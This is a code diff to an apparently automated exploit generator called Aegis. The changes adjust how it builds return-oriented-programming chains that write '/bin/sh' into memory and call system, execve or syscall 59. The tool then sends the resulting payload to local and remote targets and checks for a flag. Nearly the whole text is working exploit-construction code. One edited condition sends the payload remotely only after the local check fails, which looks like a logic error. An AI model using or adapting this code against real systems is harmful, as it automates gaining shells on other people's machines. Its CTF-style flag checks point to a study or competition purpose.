@@ -35,6 +35,7 @@ class Aegis:
 
         self.symbolic_padding = None
         self.padding = None
+        self.failed = False
 
         self.got_targets = None
 
@@ -99,8 +100,8 @@ class Aegis:
             # Check if one call functions are in the binary
             if win_gadget:
                 aegis_log.debug(f"Setting up return to win with gadget")
-                if self.failed:
-                    self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
+                #if self.failed:
+                    #self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                 self.against.chain += p64(win_gadget)
                 self.against.exploit = self.against.padding + self.against.chain
             elif function == "win":
@@ -111,26 +112,28 @@ class Aegis:
                 aegis_log.debug(f"Setting up return to system")
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
+                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string])
-                    self.against.exploit = self.against.padding + self.against.chain
+
+                self.against.exploit = self.against.padding + self.against.chain
             elif function == "execve":
                 aegis_log.debug(f"Setting up return to execve")
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
-
+                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
-                    self.against.exploit = self.against.padding + self.against.chain
+                self.against.exploit = self.against.padding + self.against.chain
             elif function == "syscall":
                 aegis_log.debug(f"Setting up return to syscall")
 
                 if not string:
                     self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
-
+                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                 if string:
                     self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
-                    self.against.exploit = self.against.padding + self.against.chain
+                self.against.exploit = self.against.padding + self.against.chain
             else:
                 if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                     aegis_log.debug(f"Setting up return to puts")
@@ -149,6 +152,7 @@ class Aegis:
         """Create and run exploit using Against module."""
         aegis_log.debug(f"Setting up exploit")
         chain_len = len(self.against.chain)
+        exp = open("exploit", "wb")
 
         if chain_len > 0:
             aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
@@ -158,6 +162,7 @@ class Aegis:
         if args.GDB:
             self.against.process = self.against.start("GDB")
             self.against.send_exploit()
+            #self.against.verify_flag()
 
             aegis_log.debug(f"Adding ret to chain")
             ret = p64(self.rop.find_gadget(["ret"])[0])
@@ -168,20 +173,24 @@ class Aegis:
 
             self.against.process = self.against.start("GDB")
             self.against.send_exploit()
-
+            #self.against.verify_flag()
+        
         else:
             self.against.process = self.against.start("")
             self.against.send_exploit()
+            exp.write(self.against.exploit)
             if self.against.verify_flag() == False:
                 ret = p64(self.rop.find_gadget(["ret"])[0])
                 chain_len = len(self.against.chain)
                 aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
                 self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
                 self.against.process = self.against.start("")
+
                 self.against.send_exploit()
-                if self.against.verify_flag() == True:
+                if self.against.verify_flag() == False:
                     self.against.process = self.against.start("REMOTE")
                     self.against.send_exploit()
+                    
             else:
                 self.against.process = self.against.start("REMOTE")
                 self.against.send_exploit()
